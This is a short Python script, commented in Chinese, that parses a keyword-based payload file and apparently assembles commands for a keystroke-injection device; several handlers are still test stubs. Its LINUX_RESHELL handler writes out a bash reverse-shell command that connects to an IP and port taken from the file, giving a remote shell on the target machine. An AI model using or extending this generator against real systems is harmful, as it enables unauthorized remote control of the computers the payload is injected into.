
paylist = [] # 使用列表存储payload
# payload 读取函数
def Rpayload():
    
    with open ('payload2.txt','r') as payload:
        for line in payload:
            line = line.strip()
            
            if line == "WINDOWS":
                win()
            elif line == "LINUX_OPENSHELL":
                linux_openshell()
            elif line[:13] == "LINUX_RESHELL":
                linux_reshell(line[14:])
                
            elif line == "POWERSHELL":
                powershell()
                
            elif line == "CMD":
                cmd()
                
            elif line[:4] == "ECHO":
                paylist.append(line[5:])
                
            elif line == "TOGGLE_INPUT": # 切换输入法
                toggleinput()
                
            elif line[:3] == "set":
                if line[:8] == "set Time":
                    time(line[9:])
                    
            print(paylist)
    return paylist

def main():
    Rpayload()

# 处理函数
def win():
    print("test")

def linux_reshell(line):
    ip,port = line.split()
    paylist.append(f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1")

def powershell():
    print("test_powershell")
    paylist.append("powershell")

def cmd():
    print("test_cmd")
    paylist.append("cmd")

def toggleinput():
    paylist.append("toggleinput")

def linux_openshell():
    paylist.append("linux_openshell")

# SET

def time(time):
    paylist.append("time="+time)

if __name__ == '__main__':
    main()
